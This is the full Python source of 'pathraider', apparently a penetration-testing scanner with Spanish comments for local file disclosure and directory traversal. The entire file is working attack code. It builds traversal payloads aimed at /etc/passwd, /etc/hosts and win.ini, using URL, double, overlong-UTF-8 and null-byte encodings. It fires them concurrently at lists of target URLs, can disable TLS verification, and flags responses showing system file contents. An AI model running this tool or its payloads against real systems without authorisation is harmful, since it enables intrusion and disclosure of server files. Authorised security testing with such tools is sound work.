#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""pathraider – escaner de Local File Disclosure y Directory Traversal.

- Un objetivo (--url) o multiples desde archivo (--list).
- Inyeccion con marcador FUZZ o parametro configurable (--param).
- 132 rutas generadas desde 12 rutas base con encodings.
- Deteccion heuristica de contenido sensible.
- Escaneo concurrente con hilos.
- Exportacion a JSON y JSONL.
"""

__version__ = "1.2.0"

import argparse
import json
import sys
import urllib.parse
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
from typing import Dict, List, Optional

import requests
from colorama import Fore, Style, init

init(autoreset=True)

BASE_PATHS: List[str] = [
    "../../etc/passwd", "../../../etc/passwd", "../../../../etc/passwd",
    "../../etc/hosts", "../../../etc/hosts", "../../../../etc/hosts",
    "../../windows/win.ini", "../../../windows/win.ini", "../../../../windows/win.ini",
    "../../windows/system32/drivers/etc/hosts", "../../../windows/system32/drivers/etc/hosts", "../../../../windows/system32/drivers/etc/hosts",
]


def expand_encodings(paths: List[str]) -> List[str]:
    result = list(paths)
    for path in paths:
        variants = [
            path.replace("../", "%2e%2e%2f"),
            path.replace("../", "%252e%252e%252f"),
            path.replace("../", "..%2f"),
            path.replace("../", "..\\"),
            path.replace("../", "..%5c"),
            path.replace("../", "..%c0%af"),
            path.replace("../", "%c0%ae%c0%ae%2f"),
            path.replace("../", ".//"),
            path + "%00",
            path + "%00.jpg",
        ]
        for v in variants:
            if v not in result:
                result.append(v)
    return result


DEFAULT_PATHS: List[str] = expand_encodings(BASE_PATHS)
UNIX_SIGNATURES: List[str] = ["root:x:0:0:", "/bin/bash", "/bin/sh", ":/home/"]
WIN_SIGNATURES: List[str] = ["[extensions]", "[fonts]", "for 16-bit app support", "C:\\WINDOWS\\"]


def log(msg: str, color: Optional[str] = None) -> None:
    if color == "red":
        print(Fore.RED + msg + Style.RESET_ALL, file=sys.stderr)
    elif color == "yellow":
        print(Fore.YELLOW + msg + Style.RESET_ALL, file=sys.stderr)
    elif color == "cyan":
        print(Fore.CYAN + msg + Style.RESET_ALL, file=sys.stderr)
    elif color == "green":
        print(Fore.GREEN + msg + Style.RESET_ALL, file=sys.stderr)
    else:
        print(msg, file=sys.stderr)


def print_banner() -> None:
    log(r"""
+------------------------------------------------------+
|                                                      |
|  ██████╗  ██████╗ ███████╗██╗  ██╗                |
|  ██╔══██╗██╔════╝ ██╔════╝██║  ██║                |
|  ██████╔╝███████╗█████╗  ███████║                |
|  ██╔═══╝ ██╔══██╗██╔══╝  ██╔══██║                |
|  ██║     ╚██████╔╝███████╗██║  ██║                |
|  ╚═╝      ╚═════╝ ╚══════╝╚═╝  ╚═╝                |
|                                                      |
|  LFD & Directory Traversal scanner  v%s             |
|  by theoffsecgirl                                    |
+------------------------------------------------------+
""" % __version__, color="cyan")


def build_targets(args: argparse.Namespace) -> List[str]:
    targets: List[str] = []
    if args.url:
        targets.append(args.url.strip())
    if args.list:
        with open(args.list, "r", encoding="utf-8", errors="ignore") as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith("#"):
                    targets.append(line)
    clean: List[str] = []
    for t in targets:
        t = t.strip()
        if not t:
            continue
        if not t.startswith(("http://", "https://")):
            t = "http://" + t
        clean.append(t)
    if not clean:
        log("[!] No se han proporcionado objetivos validos.", color="red")
        sys.exit(1)
    return list(dict.fromkeys(clean))


def load_paths(args: argparse.Namespace) -> List[str]:
    paths = list(DEFAULT_PATHS)
    if args.paths:
        try:
            with open(args.paths, "r", encoding="utf-8", errors="ignore") as f:
                for line in f:
                    line = line.strip()
                    if line and not line.startswith("#") and line not in paths:
                        paths.append(line)
        except OSError as e:
            log("[!] No se pudo leer el archivo de rutas: {}".format(e), color="red")
    return paths


def build_url(base: str, param_name: str, path: str) -> str:
    if "FUZZ" in base:
        return base.replace("FUZZ", path)
    parsed = urllib.parse.urlparse(base)
    query = dict(urllib.parse.parse_qsl(parsed.query, keep_blank_values=True))
    query[param_name] = path
    new_query = urllib.parse.urlencode(query, doseq=True)
    return urllib.parse.urlunparse(parsed._replace(query=new_query))


def response_looks_interesting(text: str) -> bool:
    t = text[:5000]
    return any(s in t for s in UNIX_SIGNATURES) or any(s in t for s in WIN_SIGNATURES) or ("root:" in t and "/bin" in t)


def normalize_finding(finding: dict, base_url: str, param: str) -> dict:
    host = urllib.parse.urlparse(base_url).netloc
    return {
        "type": "candidate",
        "vector": "lfd_traversal",
        "target": finding["url"],
        "host": host,
        "method": "GET",
        "param": param,
        "severity": "high",
        "confidence": "medium",
        "reason": "response contains local file disclosure signatures",
        "evidence": [finding["snippet"]],
        "tags": ["traversal", "lfd", "filesystem"],
        "raw": finding,
    }


def serialize_findings(findings: List[dict], fmt: str) -> str:
    if fmt == "jsonl":
        return "\n".join(json.dumps(f, ensure_ascii=False) for f in findings)
    return json.dumps(findings, indent=2, ensure_ascii=False)


def write_normalized_output(findings: List[dict], fmt: str, stdout: bool = False, output_file: Optional[str] = None) -> None:
    payload = serialize_findings(findings, fmt)
    if stdout:
        print(payload)
    if output_file:
        with open(output_file, "w", encoding="utf-8") as fout:
            fout.write(payload)
        log("[+] Findings normalizados guardados en: {}".format(output_file), color="green")


def scan_single_request(session: requests.Session, url: str, timeout: int, verify: bool, headers: Dict[str, str], path: str, verbose: bool = False) -> Optional[dict]:
    try:
        resp = session.get(url, timeout=timeout, verify=verify, headers=headers, allow_redirects=True)
        if verbose:
            log("[*] {} -> {}".format(url, resp.status_code), color="cyan")
        if resp.status_code in (200, 206, 500, 403) and response_looks_interesting(resp.text):
            snippet = resp.text[:200].replace("\n", " ").replace("\r", " ")
            return {"url": url, "status": resp.status_code, "path": path, "snippet": snippet}
    except requests.RequestException as e:
        if verbose:
            log("[!] Error en {}: {}".format(url, e), color="yellow")
    return None


def scan_target(base_url: str, paths: List[str], args: argparse.Namespace, session: requests.Session, headers: Dict[str, str]) -> List[dict]:
    findings: List[dict] = []
    with ThreadPoolExecutor(max_workers=args.threads) as executor:
        futures = [executor.submit(scan_single_request, session, build_url(base_url, args.param, p), args.timeout, not args.insecure, headers, p, args.verbose) for p in paths]
        for fut in as_completed(futures):
            result = fut.result()
            if result:
                findings.append(result)
                log("[+] Posible LFD/Traversal en {}".format(result["url"]), color="red")
    return findings


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(description="pathraider – LFD & Directory Traversal scanner by theoffsecgirl")
    parser.add_argument("-u", "--url", help="URL objetivo. Puede contener FUZZ como marcador de inyeccion.")
    parser.add_argument("-L", "--list", help="Archivo con lista de objetivos (uno por linea).")
    parser.add_argument("--paths", help="Archivo con rutas de traversal personalizadas.")
    parser.add_argument("-p", "--param", default="file", help="Parametro a usar sin FUZZ (default: file).")
    parser.add_argument("-t", "--timeout", type=int, default=5, help="Timeout por peticion en segundos (default: 5).")
    parser.add_argument("-T", "--threads", type=int, default=10, help="Hilos por objetivo (default: 10).")
    parser.add_argument("-A", "--agent", default="Mozilla/5.0 (compatible; pathraider/{})".format(__version__), help="User-Agent personalizado.")
    parser.add_argument("--insecure", action="store_true", help="Desactivar verificacion TLS.")
    parser.add_argument("--json-output", help="Archivo donde guardar reporte clasico en JSON.")
    parser.add_argument("--format", choices=["json", "jsonl"], default="json", help="Formato de findings normalizados.")
    parser.add_argument("--stdout", action="store_true", help="Enviar findings normalizados a stdout.")
    parser.add_argument("--findings-output", help="Archivo para findings normalizados.")
    parser.add_argument("-v", "--verbose", action="store_true", help="Modo verbose.")
    parser.add_argument("--version", action="version", version="pathraider {}".format(__version__))
    args = parser.parse_args()
    if not args.url and not args.list:
        parser.error("Debes proporcionar --url o --list.")
    return args


def main() -> None:
    print_banner()
    args = parse_args()
    targets = build_targets(args)
    paths = load_paths(args)
    log("[i] Rutas de prueba cargadas: {}".format(len(paths)), color="yellow")
    headers = {"User-Agent": args.agent}
    session = requests.Session()
    all_findings: Dict[str, List[dict]] = {}
    normalized_all: List[dict] = []

    for target in targets:
        log("[*] Escaneando: {}".format(target), color="cyan")
        findings = scan_target(target, paths, args, session, headers)
        all_findings[target] = findings
        normalized_all.extend(normalize_finding(f, target, args.param) for f in findings)

    total_vuln = sum(len(v) for v in all_findings.values())
    log("[+] Escaneo completado.", color="green")
    log("    Objetivos analizados  : {}".format(len(targets)))
    log("    Posibles LFD/Traversal: {}".format(total_vuln))

    if args.json_output:
        report = {"tool": "pathraider", "version": __version__, "generated_at": datetime.utcnow().isoformat() + "Z", "targets": all_findings}
        try:
            with open(args.json_output, "w", encoding="utf-8") as fout:
                json.dump(report, fout, indent=2, ensure_ascii=False)
            log("[+] JSON guardado en: {}".format(args.json_output), color="green")
        except OSError as e:
            log("[!] No se pudo escribir el JSON: {}".format(e), color="red")

    if args.stdout or args.findings_output:
        write_normalized_output(normalized_all, fmt=args.format, stdout=args.stdout, output_file=args.findings_output)


if __name__ == "__main__":
    main()
